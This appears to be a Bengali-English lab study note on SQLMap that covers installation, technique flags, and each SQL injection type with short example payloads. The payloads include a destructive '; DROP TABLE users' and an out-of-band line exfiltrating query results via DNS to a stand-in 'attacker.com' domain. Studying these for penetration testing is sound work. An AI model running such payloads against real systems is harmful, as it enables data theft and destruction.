## **SQLMap Overview**


## 1. SQLMap কী?

- [SQLMap](https://github.com/sqlmapproject/sqlmap?utm_source=chatgpt.com) একটি free, open-source Python-based penetration testing tool।
- SQL Injection (SQLi) detect ও exploit করার কাজ automate করে।
- 2006 সাল থেকে development চলছে এবং এখনো maintained।

### Example

```
python sqlmap.py -u 'http://inlanefreight.htb/page.php?id=5'
```

SQLMap সাধারণত:

- Target connection test করে।
- WAF/IPS/IDS আছে কি না check করে।
- URL content stable কি না test করে।
- GET parameter dynamic কি না check করে।
- Parameter injectable কি না test করে।
- Possible DBMS identify করে।

### SQLMap Features

| Feature                         | কাজ                                   |
| ------------------------------- | ------------------------------------- |
| Target connection               | Target-এর সাথে connection             |
| Injection detection             | SQLi detect                           |
| Fingerprinting                  | DBMS identify                         |
| Enumeration                     | Database information বের করা          |
| Optimization                    | Performance improve                   |
| Protection detection and bypass | Tamper scripts দিয়ে protection bypass |
| Database content retrieval      | Database data বের করা                 |
| File system access              | File system access                    |
| OS command execution            | Operating system command চালানো       |

## 2. SQLMap Installation

SQLMap Pwnbox এবং বেশিরভাগ security-focused OS-এ pre-installed থাকে।

Debian installation:

```
sudo apt install sqlmap
```

Manual installation:

```
git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev
```

Run:

```
python sqlmap.py
```

## 4. Supported SQL Injection Types

SQLMap সব পরিচিত SQLi type detect ও exploit করতে পারে।

সব technique দেখতে:

```
sqlmap -hh
```

Technique option:

```
--technique=TECH..
```

Default: `BEUSTQ`

| Character | SQLi Type           |
| --------- | ------------------- |
| `B`       | Boolean-based blind |
| `E`       | Error-based         |
| `U`       | UNION query-based   |
| `S`       | Stacked queries     |
| `T`       | Time-based blind    |
| `Q`       | Inline queries      |

## 5. Boolean-based Blind SQL Injection

Example:

```
AND 1=1
```

- `TRUE` ও `FALSE` query result-এর response difference দেখে SQLi exploit করে।
- প্রতি request-এ 1 bit information পাওয়া যায়।
- Actual data বের করতে সাধারণত প্রতি character-এর জন্য প্রায় 7–8 requests লাগে।
- Character set ও response stability অনুযায়ী request সংখ্যা পরিবর্তন হতে পারে।
- Server response-এর raw content, HTTP codes, page titles, filtered text ইত্যাদি compare করে।

Response:

- `TRUE`: Regular server response-এর মতো বা সামান্য difference থাকে।
- `FALSE`: Regular response থেকে উল্লেখযোগ্য difference থাকে।

এটি web application-এ সবচেয়ে common SQLi type।

## 6. Error-based SQL Injection

Example:

```
AND GTID_SUBSET(@@version,0)
```

- Database-related error server response-এ দেখা গেলে সেই error-এর মাধ্যমে query result বের করা সম্ভব।
- DBMS-specific payload ব্যবহার করা হয়, যেগুলো known misbehavior trigger করে।

Supported DBMS:

|                      |            |         |
| -------------------- | ---------- | ------- |
| MySQL                | PostgreSQL | Oracle  |
| Microsoft SQL Server | Sybase     | Vertica |
| IBM DB2              | Firebird   | MonetDB |

- UNION-based ছাড়া অন্যান্য SQLi type-এর তুলনায় দ্রুত।
- প্রতি request-এ সীমিত পরিমাণ data (যেমন 200 bytes) retrieve করতে পারে।
- এই data-কে `chunks` বলা হয়।

## 7. UNION Query-based SQL Injection

Example:

```
UNION ALL SELECT 1,@@version,3
```

- `UNION` দিয়ে original vulnerable query-এর সাথে injected query-এর result যুক্ত করা যায়।
- Original query-এর result page-এ render হলে injected query-এর result-ও response-এ দেখা যায়।
- এটি সবচেয়ে fast SQLi type।
- Ideal condition-এ একটি request দিয়েই পুরো database table-এর content বের করা সম্ভব।

## 8. Stacked Queries

Example:

```
; DROP TABLE users
```

- Stacking বা Piggy-backing হলো vulnerable query-এর পরে additional SQL statement inject করা।
- `INSERT`, `UPDATE`, `DELETE`-এর মতো non-query statement চালাতে stacked queries support প্রয়োজন।
- `Microsoft SQL Server` ও `PostgreSQL` default-এ এটি support করে।
- SQLMap এই vulnerability ব্যবহার করে:
  - Non-query statement execute করতে পারে।
  - Advanced features, যেমন OS command execution ব্যবহার করতে পারে।
  - Time-based blind SQLi-এর মতো data retrieve করতে পারে।

## 9. Time-based Blind SQL Injection

Example:

```
AND 1=IF(2>1,SLEEP(5),0)
```

- Boolean-based blind SQLi-এর মতোই কাজ করে।
- তবে এখানে response time দেখে `TRUE` ও `FALSE` আলাদা করা হয়।

Response:

- `TRUE`: Regular response-এর তুলনায় noticeable delay হয়।
- `FALSE`: Regular response-এর মতোই সময় লাগে।

ব্যবহার:

- Boolean-based blind SQLi-এর তুলনায় অনেক slow।
- `TRUE` result হলে server response delay হয়।
- Boolean-based SQLi কাজ না করলে এটি ব্যবহার করা হয়।
- যেমন vulnerable SQL statement যদি non-query (`INSERT`, `UPDATE`, `DELETE`) হয় এবং page rendering-এ কোনো effect না ফেলে, তাহলে time-based SQLi প্রয়োজন হতে পারে।

## 10. Inline Queries

Example:

```
SELECT (SELECT @@version) from
```

- Original query-এর মধ্যে আরেকটি query embed করা হয়।
- এটি uncommon, কারণ vulnerable web application-কে নির্দিষ্টভাবে লেখা থাকতে হয়।
- SQLMap এই SQLi type-ও support করে।

## 11. Out-of-band SQL Injection

Example:

```
LOAD_FILE(CONCAT('\\\\',@@version,'.attacker.com\\README.txt'))
```

- এটি advanced SQLi type।
- অন্য SQLi type unsupported বা খুব slow হলে (যেমন time-based blind SQLi) ব্যবহার করা হয়।
- SQLMap DNS exfiltration-এর মাধ্যমে out-of-band SQLi support করে।
- Requested query-এর result DNS traffic দিয়ে retrieve করা হয়।

কাজের পদ্ধতি:

1. নিজের control-এ থাকা domain-এর DNS server-এ SQLMap run করতে হয় (যেমন `.attacker.com`)।
2. SQLMap vulnerable server-কে non-existent subdomain request করতে বাধ্য করে।
3. Example: `foo.attacker.com`
4. এখানে `foo` হলো যে SQL response retrieve করতে চাই।
5. SQLMap erroring DNS request collect করে।
6. `foo` অংশগুলো সংগ্রহ করে পুরো SQL response তৈরি করে।
